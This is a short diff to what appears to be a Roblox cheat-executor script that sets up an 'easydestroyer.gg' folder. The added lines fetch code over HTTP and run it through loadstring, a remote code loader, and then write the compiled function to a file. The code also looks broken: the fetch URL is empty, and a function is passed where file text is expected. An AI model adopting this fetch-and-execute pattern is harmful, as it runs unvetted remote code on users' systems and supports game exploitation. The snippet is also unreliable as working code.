@@ -1,3 +1,7 @@
+local HttpService = game:GetService("HttpService")
+local code = HttpService:GetAsync("", true)
+local f = loadstring(code)
+
 if isfolder("easydestroyer.gg") == false then
   makefolder("easydestroyer.gg")
 end
@@ -33,7 +37,7 @@ local cm = {
 }
 
 if isfile(script["file"]) == false then
-  writefile(script["file"], "loadstring")
+  writefile(script["file"], f)
 end
 
 if isfile(library["file"]) == false then
